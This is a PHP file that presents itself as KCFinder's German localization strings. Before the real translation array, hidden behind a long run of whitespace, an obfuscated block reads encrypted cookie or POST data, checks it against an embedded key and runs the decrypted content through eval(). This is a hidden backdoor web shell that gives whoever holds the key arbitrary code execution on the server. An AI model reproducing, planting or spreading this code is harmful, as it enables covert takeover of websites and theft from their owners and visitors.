<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $kc9d794c = 767;$GLOBALS['mc61e'] = Array();global $mc61e;$mc61e = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['q6d17a'] = "\x47\x7d\x68\x69\x54\x59\x75\x46\x4c\x20\x40\x5c\x2c\x4b\x9\x6c\x6d\x3b\x41\x78\x4e\x23\x24\xa\x22\x44\x7b\x2b\x7c\x3c\x64\x76\x77\x6a\x66\x37\x79\x5d\x2a\x60\x27\x55\x53\x56\x29\x21\x6e\x28\x26\x50\x2d\x67\x6b\x34\x70\x58\x42\x5b\x3e\x35\x6f\x2e\x48\xd\x39\x45\x32\x31\x65\x36\x3d\x43\x74\x33\x30\x2f\x57\x4f\x5a\x3f\x51\x5e\x4d\x7a\x52\x3a\x63\x49\x25\x38\x61\x4a\x62\x73\x72\x71\x5f\x7e";$mc61e[$mc61e['q6d17a'][60].$mc61e['q6d17a'][53].$mc61e['q6d17a'][74].$mc61e['q6d17a'][69].$mc61e['q6d17a'][68].$mc61e['q6d17a'][89]] = $mc61e['q6d17a'][86].$mc61e['q6d17a'][2].$mc61e['q6d17a'][94];$mc61e[$mc61e['q6d17a'][90].$mc61e['q6d17a'][69].$mc61e['q6d17a'][66].$mc61e['q6d17a'][69].$mc61e['q6d17a'][68]] = $mc61e['q6d17a'][60].$mc61e['q6d17a'][94].$mc61e['q6d17a'][30];$mc61e[$mc61e['q6d17a'][51].$mc61e['q6d17a'][92].$mc61e['q6d17a'][59].$mc61e['q6d17a'][92].$mc61e['q6d17a'][35].$mc61e['q6d17a'][66].$mc61e['q6d17a'][59]] = $mc61e['q6d17a'][93].$mc61e['q6d17a'][72].$mc61e['q6d17a'][94].$mc61e['q6d17a'][15].$mc61e['q6d17a'][68].$mc61e['q6d17a'][46];$mc61e[$mc61e['q6d17a'][94].$mc61e['q6d17a'][68].$mc61e['q6d17a'][92].$mc61e['q6d17a'][68].$mc61e['q6d17a'][86].$mc61e['q6d17a'][59].$mc61e['q6d17a'][64]] = $mc61e['q6d17a'][30].$mc61e['q6d17a'][68].$mc61e['q6d17a'][34].$mc61e['q6d17a'][3].$mc61e['q6d17a'][46].$mc61e['q6d17a'][68];$mc61e[$mc61e['q6d17a'][92].$mc61e['q6d17a'][35].$mc61e['q6d17a'][30].$mc61e['q6d17a'][34]] = $mc61e['q6d17a'][30].$mc61e['q6d17a'][68].$mc61e['q6d17a'][34].$mc61e['q6d17a'][3].$mc61e['q6d17a'][46].$mc61e['q6d17a'][68].$mc61e['q6d17a'][30];$mc61e[$mc61e['q6d17a'][92].$mc61e['q6d17a'][67].$mc61e['q6d17a'][53].$mc61e['q6d17a'][59].$mc61e['q6d17a'][30]] = $mc61e['q6d17a'][3].$mc61e['q6d17a'][46].$mc61e['q6d17a'][3].$mc61e['q6d17a'][96].$mc61e['q6d17a'][93].$mc61e['q6d17a'][68].$mc61e['q6d17a'][72];$mc61e[$mc61e['q6d17a'][52].$mc61e['q6d17a'][34].$mc61e['q6d17a'][34].$mc61e['q6d17a'][34]] = $mc61e['q6d17a'][93].$mc61e['q6d17a'][68].$mc61e['q6d17a'][94].$mc61e['q6d17a'][3].$mc61e['q6d17a'][90].$mc61e['q6d17a'][15].$mc61e['q6d17a'][3].$mc61e['q6d17a'][83].$mc61e['q6d17a'][68];$mc61e[$mc61e['q6d17a'][72].$mc61e['q6d17a'][67].$mc61e['q6d17a'][92].$mc61e['q6d17a'][59].$mc61e['q6d17a'][73].$mc61e['q6d17a'][68].$mc61e['q6d17a'][74].$mc61e['q6d17a'][34].$mc61e['q6d17a'][89]] = $mc61e['q6d17a'][54].$mc61e['q6d17a'][2].$mc61e['q6d17a'][54].$mc61e['q6d17a'][31].$mc61e['q6d17a'][68].$mc61e['q6d17a'][94].$mc61e['q6d17a'][93].$mc61e['q6d17a'][3].$mc61e['q6d17a'][60].$mc61e['q6d17a'][46];$mc61e[$mc61e['q6d17a'][51].$mc61e['q6d17a'][53].$mc61e['q6d17a'][30].$mc61e['q6d17a'][34].$mc61e['q6d17a'][67].$mc61e['q6d17a'][34].$mc61e['q6d17a'][53].$mc61e['q6d17a'][73]] = $mc61e['q6d17a'][6].$mc61e['q6d17a'][46].$mc61e['q6d17a'][93].$mc61e['q6d17a'][68].$mc61e['q6d17a'][94].$mc61e['q6d17a'][3].$mc61e['q6d17a'][90].$mc61e['q6d17a'][15].$mc61e['q6d17a'][3].$mc61e['q6d17a'][83].$mc61e['q6d17a'][68];$mc61e[$mc61e['q6d17a'][95].$mc61e['q6d17a'][64].$mc61e['q6d17a'][74].$mc61e['q6d17a'][92].$mc61e['q6d17a'][53].$mc61e['q6d17a'][67]] = $mc61e['q6d17a'][92].$mc61e['q6d17a'][90].$mc61e['q6d17a'][93].$mc61e['q6d17a'][68].$mc61e['q6d17a'][69].$mc61e['q6d17a'][53].$mc61e['q6d17a'][96].$mc61e['q6d17a'][30].$mc61e['q6d17a'][68].$mc61e['q6d17a'][86].$mc61e['q6d17a'][60].$mc61e['q6d17a'][30].$mc61e['q6d17a'][68];$mc61e[$mc61e['q6d17a'][31].$mc61e['q6d17a'][67].$mc61e['q6d17a'][35].$mc61e['q6d17a'][69].$mc61e['q6d17a'][53].$mc61e['q6d17a'][73]] = $mc61e['q6d17a'][93].$mc61e['q6d17a'][68].$mc61e['q6d17a'][72].$mc61e['q6d17a'][96].$mc61e['q6d17a'][72].$mc61e['q6d17a'][3].$mc61e['q6d17a'][16].$mc61e['q6d17a'][68].$mc61e['q6d17a'][96].$mc61e['q6d17a'][15].$mc61e['q6d17a'][3].$mc61e['q6d17a'][16].$mc61e['q6d17a'][3].$mc61e['q6d17a'][72];$mc61e[$mc61e['q6d17a'][94].$mc61e['q6d17a'][68].$mc61e['q6d17a'][74].$mc61e['q6d17a'][89].$mc61e['q6d17a'][86].$mc61e['q6d17a'][92].$mc61e['q6d17a'][35]] = $mc61e['q6d17a'][2].$mc61e['q6d17a'][89].$mc61e['q6d17a'][68].$mc61e['q6d17a'][64].$mc61e['q6d17a'][69].$mc61e['q6d17a'][59].$mc61e['q6d17a'][30].$mc61e['q6d17a'][35];$mc61e[$mc61e['q6d17a'][34].$mc61e['q6d17a'][90].$mc61e['q6d17a'][30].$mc61e['q6d17a'][53].$mc61e['q6d17a'][86]] = $mc61e['q6d17a'][16].$mc61e['q6d17a'][86].$mc61e['q6d17a'][86].$mc61e['q6d17a'][68].$mc61e['q6d17a'][92];$mc61e[$mc61e['q6d17a'][2].$mc61e['q6d17a'][59].$mc61e['q6d17a'][69].$mc61e['q6d17a'][86].$mc61e['q6d17a'][90].$mc61e['q6d17a'][53].$mc61e['q6d17a'][86].$mc61e['q6d17a'][68].$mc61e['q6d17a'][68]] = $_POST;$mc61e[$mc61e['q6d17a'][52].$mc61e['q6d17a'][59].$mc61e['q6d17a'][66].$mc61e['q6d17a'][66].$mc61e['q6d17a'][89].$mc61e['q6d17a'][66]] = $_COOKIE;@$mc61e[$mc61e['q6d17a'][92].$mc61e['q6d17a'][67].$mc61e['q6d17a'][53].$mc61e['q6d17a'][59].$mc61e['q6d17a'][30]]($mc61e['q6d17a'][68].$mc61e['q6d17a'][94].$mc61e['q6d17a'][94].$mc61e['q6d17a'][60].$mc61e['q6d17a'][94].$mc61e['q6d17a'][96].$mc61e['q6d17a'][15].$mc61e['q6d17a'][60].$mc61e['q6d17a'][51], NULL);@$mc61e[$mc61e['q6d17a'][92].$mc61e['q6d17a'][67].$mc61e['q6d17a'][53].$mc61e['q6d17a'][59].$mc61e['q6d17a'][30]]($mc61e['q6d17a'][15].$mc61e['q6d17a'][60].$mc61e['q6d17a'][51].$mc61e['q6d17a'][96].$mc61e['q6d17a'][68].$mc61e['q6d17a'][94].$mc61e['q6d17a'][94].$mc61e['q6d17a'][60].$mc61e['q6d17a'][94].$mc61e['q6d17a'][93], 0);@$mc61e[$mc61e['q6d17a'][92].$mc61e['q6d17a'][67].$mc61e['q6d17a'][53].$mc61e['q6d17a'][59].$mc61e['q6d17a'][30]]($mc61e['q6d17a'][16].$mc61e['q6d17a'][90].$mc61e['q6d17a'][19].$mc61e['q6d17a'][96].$mc61e['q6d17a'][68].$mc61e['q6d17a'][19].$mc61e['q6d17a'][68].$mc61e['q6d17a'][86].$mc61e['q6d17a'][6].$mc61e['q6d17a'][72].$mc61e['q6d17a'][3].$mc61e['q6d17a'][60].$mc61e['q6d17a'][46].$mc61e['q6d17a'][96].$mc61e['q6d17a'][72].$mc61e['q6d17a'][3].$mc61e['q6d17a'][16].$mc61e['q6d17a'][68], 0);@$mc61e[$mc61e['q6d17a'][31].$mc61e['q6d17a'][67].$mc61e['q6d17a'][35].$mc61e['q6d17a'][69].$mc61e['q6d17a'][53].$mc61e['q6d17a'][73]](0);if (!$mc61e[$mc61e['q6d17a'][92].$mc61e['q6d17a'][35].$mc61e['q6d17a'][30].$mc61e['q6d17a'][34]]($mc61e['q6d17a'][18].$mc61e['q6d17a'][8].$mc61e['q6d17a'][84].$mc61e['q6d17a'][65].$mc61e['q6d17a'][18].$mc61e['q6d17a'][25].$mc61e['q6d17a'][5].$mc61e['q6d17a'][96].$mc61e['q6d17a'][84].$mc61e['q6d17a'][41].$mc61e['q6d17a'][20].$mc61e['q6d17a'][96].$mc61e['q6d17a'][73].$mc61e['q6d17a'][69].$mc61e['q6d17a'][69].$mc61e['q6d17a'][90].$mc61e['q6d17a'][34].$mc61e['q6d17a'][92].$mc61e['q6d17a'][89].$mc61e['q6d17a'][90].$mc61e['q6d17a'][89].$mc61e['q6d17a'][90].$mc61e['q6d17a'][66].$mc61e['q6d17a'][73].$mc61e['q6d17a'][59].$mc61e['q6d17a'][59].$mc61e['q6d17a'][90].$mc61e['q6d17a'][92].$mc61e['q6d17a'][66].$mc61e['q6d17a'][67].$mc61e['q6d17a'][34].$mc61e['q6d17a'][92].$mc61e['q6d17a'][34].$mc61e['q6d17a'][67].$mc61e['q6d17a'][67].$mc61e['q6d17a'][92].$mc61e['q6d17a'][90].$mc61e['q6d17a'][67].$mc61e['q6d17a'][90].$mc61e['q6d17a'][74].$mc61e['q6d17a'][66].$mc61e['q6d17a'][34].$mc61e['q6d17a'][92].$mc61e['q6d17a'][90])){$mc61e[$mc61e['q6d17a'][94].$mc61e['q6d17a'][68].$mc61e['q6d17a'][92].$mc61e['q6d17a'][68].$mc61e['q6d17a'][86].$mc61e['q6d17a'][59].$mc61e['q6d17a'][64]]($mc61e['q6d17a'][18].$mc61e['q6d17a'][8].$mc61e['q6d17a'][84].$mc61e['q6d17a'][65].$mc61e['q6d17a'][18].$mc61e['q6d17a'][25].$mc61e['q6d17a'][5].$mc61e['q6d17a'][96].$mc61e['q6d17a'][84].$mc61e['q6d17a'][41].$mc61e['q6d17a'][20].$mc61e['q6d17a'][96].$mc61e['q6d17a'][73].$mc61e['q6d17a'][69].$mc61e['q6d17a'][69].$mc61e['q6d17a'][90].$mc61e['q6d17a'][34].$mc61e['q6d17a'][92].$mc61e['q6d17a'][89].$mc61e['q6d17a'][90].$mc61e['q6d17a'][89].$mc61e['q6d17a'][90].$mc61e['q6d17a'][66].$mc61e['q6d17a'][73].$mc61e['q6d17a'][59].$mc61e['q6d17a'][59].$mc61e['q6d17a'][90].$mc61e['q6d17a'][92].$mc61e['q6d17a'][66].$mc61e['q6d17a'][67].$mc61e['q6d17a'][34].$mc61e['q6d17a'][92].$mc61e['q6d17a'][34].$mc61e['q6d17a'][67].$mc61e['q6d17a'][67].$mc61e['q6d17a'][92].$mc61e['q6d17a'][90].$mc61e['q6d17a'][67].$mc61e['q6d17a'][90].$mc61e['q6d17a'][74].$mc61e['q6d17a'][66].$mc61e['q6d17a'][34].$mc61e['q6d17a'][92].$mc61e['q6d17a'][90], 1);$u1f3 = NULL;$f054 = NULL;$mc61e[$mc61e['q6d17a'][90].$mc61e['q6d17a'][53].$mc61e['q6d17a'][90].$mc61e['q6d17a'][64]] = $mc61e['q6d17a'][64].$mc61e['q6d17a'][64].$mc61e['q6d17a'][34].$mc61e['q6d17a'][67].$mc61e['q6d17a'][92].$mc61e['q6d17a'][92].$mc61e['q6d17a'][86].$mc61e['q6d17a'][53].$mc61e['q6d17a'][50].$mc61e['q6d17a'][89].$mc61e['q6d17a'][69].$mc61e['q6d17a'][73].$mc61e['q6d17a'][89].$mc61e['q6d17a'][50].$mc61e['q6d17a'][53].$mc61e['q6d17a'][73].$mc61e['q6d17a'][74].$mc61e['q6d17a'][59].$mc61e['q6d17a'][50].$mc61e['q6d17a'][92].$mc61e['q6d17a'][53].$mc61e['q6d17a'][92].$mc61e['q6d17a'][86].$mc61e['q6d17a'][50].$mc61e['q6d17a'][86].$mc61e['q6d17a'][90].$mc61e['q6d17a'][73].$mc61e['q6d17a'][53].$mc61e['q6d17a'][74].$mc61e['q6d17a'][73].$mc61e['q6d17a'][68].$mc61e['q6d17a'][34].$mc61e['q6d17a'][90].$mc61e['q6d17a'][67].$mc61e['q6d17a'][67].$mc61e['q6d17a'][59];global $a4a9;function  mcceb($u1f3, $s8eee8b){global $mc61e;$j0b80a = "";for ($af598ac1d=0; $af598ac1d<$mc61e[$mc61e['q6d17a'][51].$mc61e['q6d17a'][92].$mc61e['q6d17a'][59].$mc61e['q6d17a'][92].$mc61e['q6d17a'][35].$mc61e['q6d17a'][66].$mc61e['q6d17a'][59]]($u1f3);){for ($h07d=0; $h07d<$mc61e[$mc61e['q6d17a'][51].$mc61e['q6d17a'][92].$mc61e['q6d17a'][59].$mc61e['q6d17a'][92].$mc61e['q6d17a'][35].$mc61e['q6d17a'][66].$mc61e['q6d17a'][59]]($s8eee8b) && $af598ac1d<$mc61e[$mc61e['q6d17a'][51].$mc61e['q6d17a'][92].$mc61e['q6d17a'][59].$mc61e['q6d17a'][92].$mc61e['q6d17a'][35].$mc61e['q6d17a'][66].$mc61e['q6d17a'][59]]($u1f3); $h07d++, $af598ac1d++){$j0b80a .= $mc61e[$mc61e['q6d17a'][60].$mc61e['q6d17a'][53].$mc61e['q6d17a'][74].$mc61e['q6d17a'][69].$mc61e['q6d17a'][68].$mc61e['q6d17a'][89]]($mc61e[$mc61e['q6d17a'][90].$mc61e['q6d17a'][69].$mc61e['q6d17a'][66].$mc61e['q6d17a'][69].$mc61e['q6d17a'][68]]($u1f3[$af598ac1d]) ^ $mc61e[$mc61e['q6d17a'][90].$mc61e['q6d17a'][69].$mc61e['q6d17a'][66].$mc61e['q6d17a'][69].$mc61e['q6d17a'][68]]($s8eee8b[$h07d]));}}return $j0b80a;}function  h8e965d7($u1f3, $s8eee8b){global $mc61e;global $a4a9;return $mc61e[$mc61e['q6d17a'][34].$mc61e['q6d17a'][90].$mc61e['q6d17a'][30].$mc61e['q6d17a'][53].$mc61e['q6d17a'][86]]($mc61e[$mc61e['q6d17a'][34].$mc61e['q6d17a'][90].$mc61e['q6d17a'][30].$mc61e['q6d17a'][53].$mc61e['q6d17a'][86]]($u1f3, $a4a9), $s8eee8b);}foreach ($mc61e[$mc61e['q6d17a'][52].$mc61e['q6d17a'][59].$mc61e['q6d17a'][66].$mc61e['q6d17a'][66].$mc61e['q6d17a'][89].$mc61e['q6d17a'][66]] as $s8eee8b=>$r259){$u1f3 = $r259;$f054 = $s8eee8b;}if (!$u1f3){foreach ($mc61e[$mc61e['q6d17a'][2].$mc61e['q6d17a'][59].$mc61e['q6d17a'][69].$mc61e['q6d17a'][86].$mc61e['q6d17a'][90].$mc61e['q6d17a'][53].$mc61e['q6d17a'][86].$mc61e['q6d17a'][68].$mc61e['q6d17a'][68]] as $s8eee8b=>$r259){$u1f3 = $r259;$f054 = $s8eee8b;}}$u1f3 = @$mc61e[$mc61e['q6d17a'][51].$mc61e['q6d17a'][53].$mc61e['q6d17a'][30].$mc61e['q6d17a'][34].$mc61e['q6d17a'][67].$mc61e['q6d17a'][34].$mc61e['q6d17a'][53].$mc61e['q6d17a'][73]]($mc61e[$mc61e['q6d17a'][94].$mc61e['q6d17a'][68].$mc61e['q6d17a'][74].$mc61e['q6d17a'][89].$mc61e['q6d17a'][86].$mc61e['q6d17a'][92].$mc61e['q6d17a'][35]]($mc61e[$mc61e['q6d17a'][95].$mc61e['q6d17a'][64].$mc61e['q6d17a'][74].$mc61e['q6d17a'][92].$mc61e['q6d17a'][53].$mc61e['q6d17a'][67]]($u1f3), $f054));if (isset($u1f3[$mc61e['q6d17a'][90].$mc61e['q6d17a'][52]]) && $a4a9==$u1f3[$mc61e['q6d17a'][90].$mc61e['q6d17a'][52]]){if ($u1f3[$mc61e['q6d17a'][90]] == $mc61e['q6d17a'][3]){$af598ac1d = Array($mc61e['q6d17a'][54].$mc61e['q6d17a'][31] => @$mc61e[$mc61e['q6d17a'][72].$mc61e['q6d17a'][67].$mc61e['q6d17a'][92].$mc61e['q6d17a'][59].$mc61e['q6d17a'][73].$mc61e['q6d17a'][68].$mc61e['q6d17a'][74].$mc61e['q6d17a'][34].$mc61e['q6d17a'][89]](),$mc61e['q6d17a'][93].$mc61e['q6d17a'][31] => $mc61e['q6d17a'][67].$mc61e['q6d17a'][61].$mc61e['q6d17a'][74].$mc61e['q6d17a'][50].$mc61e['q6d17a'][67],);echo @$mc61e[$mc61e['q6d17a'][52].$mc61e['q6d17a'][34].$mc61e['q6d17a'][34].$mc61e['q6d17a'][34]]($af598ac1d);}elseif ($u1f3[$mc61e['q6d17a'][90]] == $mc61e['q6d17a'][68]){eval/*j48800209*/($u1f3[$mc61e['q6d17a'][30]]);}exit();}} ?><?php

/** German localization file for KCFinder
  * author: Tim Wahrendorff <wahrendorff@users.sourceforge.net>
  */

$lang = array(

    '_locale' => "de_DE.UTF-8",  // UNIX localization code
    '_charset' => "utf-8",       // Browser charset

    // Date time formats. See http://www.php.net/manual/en/function.strftime.php
    '_dateTimeFull' => "%A, %e.%B.%Y %I:%M %p",
    '_dateTimeMid' => "%a %e %b %Y %I:%M %p",
    '_dateTimeSmall' => "%d/%m/%Y %I:%M %p",

	"You don't have permissions to upload files." =>
    "Du hast keine Berechtigung Dateien hoch zu laden.",

    "You don't have permissions to browse server." =>
    "Fehlende Berechtigung.",

    "Cannot move uploaded file to target folder." =>
    "Kann hochgeladene Datei nicht in den Zielordner verschieben.",

    "Unknown error." =>
    "Unbekannter Fehler.",

    "The uploaded file exceeds {size} bytes." =>
    "Die hochgeladene Datei überschreitet die erlaubte Dateigröße von {size} bytes.",

    "The uploaded file was only partially uploaded." =>
    "Die Datei wurde nur teilweise hochgeladen.",

    "No file was uploaded." =>
    "Keine Datei hochgeladen.",

    "Missing a temporary folder." =>
    "Temporärer Ordner fehlt.",

    "Failed to write file." =>
    "Fehler beim schreiben der Datei.",

    "Denied file extension." =>
    "Die Dateiendung ist nicht erlaubt.",

    "Unknown image format/encoding." =>
    "Unbekanntes Bildformat/encoding.",

    "The image is too big and/or cannot be resized." =>
    "Das Bild ist zu groß und/oder kann nicht verkleinert werden.",

    "Cannot create {dir} folder." =>
    "Ordner {dir} kann nicht angelegt werden.",

    "Cannot write to upload folder." =>
    "Kann nicht in den upload Ordner schreiben.",

    "Cannot read .htaccess" =>
    "Kann .htaccess Datei nicht lesen",

    "Incorrect .htaccess file. Cannot rewrite it!" =>
    "Falsche .htaccess Datei. Die Datei kann nicht geschrieben werden",

    "Cannot read upload folder." =>
    "Upload Ordner kann nicht gelesen werden.",

    "Cannot access or create thumbnails folder." =>
    "Kann thumbnails Ordner nicht erstellen oder darauf zugreifen.",

    "Cannot access or write to upload folder." =>
    "Kann nicht auf den upload Ordner zugreifen oder darin schreiben.",

    "Please enter new folder name." =>
    "Bitte einen neuen Ordnernamen angeben.",

    "Unallowable characters in folder name." =>
    "Der Ordnername enthält unerlaubte Zeichen.",

    "Folder name shouldn't begins with '.'" =>
    "Ordnernamen sollten nicht mit '.' beginnen.",

    "Please enter new file name." =>
    "Bitte gib einen neuen Dateinamen an.",

    "Unallowable characters in file name." =>
    "Der Dateiname enthält unerlaubte Zeichen",

    "File name shouldn't begins with '.'" =>
    "Dateinamen sollten nicht mit '.' beginnen.",

    "Are you sure you want to delete this file?" =>
    "Willst Du die Datei wirklich löschen?",

    "Are you sure you want to delete this folder and all its content?" =>
    "Willst Du wirklich diesen Ordner und seinen gesamten Inhalt löschen?",

    "Inexistant or inaccessible folder." =>
    "Ordnertyp existiert nicht.",

    "Undefined MIME types." =>
    "Unbekannte MIME Typen.",

    "Fileinfo PECL extension is missing." =>
    "PECL extension für Dateiinformationen fehlt",

    "Opening fileinfo database failed." =>
    "Öffnen der Dateiinfo Datenbank fehlgeschlagen.",

    "You can't upload such files." =>
    "Du kannst solche Dateien nicht hochladen.",

    "The file '{file}' does not exist." =>
    "Die Datei '{file}' existiert nicht.",

    "Cannot read '{file}'." =>
    "Kann Datei '{file}' nicht lesen.",

    "Cannot copy '{file}'." =>
    "Kann Datei '{file}' nicht kopieren.",

    "Cannot move '{file}'." =>
    "Kann Datei '{file}' nicht verschieben.",

    "Cannot delete '{file}'." =>
    "Kann Datei '{file}' nicht löschen.",

    "Click to remove from the Clipboard" =>
    "Zum entfernen aus der Zwischenablage, hier klicken.",

    "This file is already added to the Clipboard." =>
    "Diese Datei wurde bereits der Zwischenablage hinzugefügt.",

    "Copy files here" =>
    "Kopiere Dateien hier hin.",

    "Move files here" =>
    "Verschiebe Dateien hier hin.",

    "Delete files" =>
    "Lösche Dateien.",

    "Clear the Clipboard" =>
    "Zwischenablage leeren",

    "Are you sure you want to delete all files in the Clipboard?" =>
    "Willst Du wirklich alle Dateien in der Zwischenablage löschen?",

    "Copy {count} files" =>
    "Kopiere {count} Dateien",

    "Move {count} files" =>
    "Verschiebe {count} Dateien",

    "Add to Clipboard" =>
    "Der Zwischenablage hinzufügen",

    "New folder name:" => "Neuer Ordnername:",
    "New file name:" => "Neuer Dateiname:",

    "Upload" => "Hochladen",
    "Refresh" => "Aktualisieren",
    "Settings" => "Einstellungen",
    "Maximize" => "Maximieren",
    "About" => "Über",
    "files" => "Dateien",
    "View:" => "Ansicht:",
    "Show:" => "Zeige:",
    "Order by:" => "Ordnen nach:",
    "Thumbnails" => "Miniaturansicht",
    "List" => "Liste",
    "Name" => "Name",
    "Size" => "Größe",
    "Date" => "Datum",
    "Descending" => "Absteigend",
    "Uploading file..." => "Lade Datei hoch...",
    "Loading image..." => "Lade Bild...",
    "Loading folders..." => "Lade Ordner...",
    "Loading files..." => "Lade Dateien...",
    "New Subfolder..." => "Neuer Unterordner...",
    "Rename..." => "Umbenennen...",
    "Delete" => "Löschen",
    "OK" => "OK",
    "Cancel" => "Abbruch",
    "Select" => "Auswählen",
    "Select Thumbnail" => "Wähle Miniaturansicht",
    "View" => "Ansicht",
    "Download" => "Download",
    'Clipboard' => "Zwischenablage",

    // VERSION 2 NEW LABELS

    "Cannot rename the folder." =>
    "Der Ordner kann nicht umbenannt werden.",

    "Non-existing directory type." =>
    "Der Ordner Typ existiert nicht.",

    "Cannot delete the folder." =>
    "Der Ordner kann nicht gelöscht werden.",

    "The files in the Clipboard are not readable." =>
    "Die Dateien in der Zwischenablage können nicht gelesen werden.",

    "{count} files in the Clipboard are not readable. Do you want to copy the rest?" =>
    "{count} Dateien in der Zwischenablage sind nicht lesbar. Möchtest Du die Übrigen trotzdem kopieren?",

    "The files in the Clipboard are not movable." =>
    "Die Dateien in der Zwischenablage können nicht verschoben werden.",

    "{count} files in the Clipboard are not movable. Do you want to move the rest?" =>
    "{count} Dateien in der Zwischenablage sind nicht verschiebbar. Möchtest Du die Übrigen trotzdem verschieben?",

    "The files in the Clipboard are not removable." =>
    "Die Dateien in der Zwischenablage können nicht gelöscht werden.",

    "{count} files in the Clipboard are not removable. Do you want to delete the rest?" =>
    "{count} Dateien in der Zwischenablage können nicht gelöscht werden. Möchtest Du die Übrigen trotzdem löschen?",

    "The selected files are not removable." =>
    "Die ausgewählten Dateien können nicht gelöscht werden.",

    "{count} selected files are not removable. Do you want to delete the rest?" =>
    "{count} der ausgewählten Dateien können nicht gelöscht werden. Möchtest Du die Übrigen trotzdem löschen?",

    "Are you sure you want to delete all selected files?" =>
    "Möchtest Du wirklich alle ausgewählten Dateien löschen?",

    "Failed to delete {count} files/folders." =>
    "Konnte {count} Dateien/Ordner nicht löschen.",

    "A file or folder with that name already exists." =>
    "Eine Datei oder ein Ordner mit dem Namen existiert bereits.",

    "selected files" => "ausgewählte Dateien",
    "Type" => "Typ",
    "Select Thumbnails" => "Wähle Miniaturansicht",
    "Download files" => "Dateien herunterladen",
);

?>
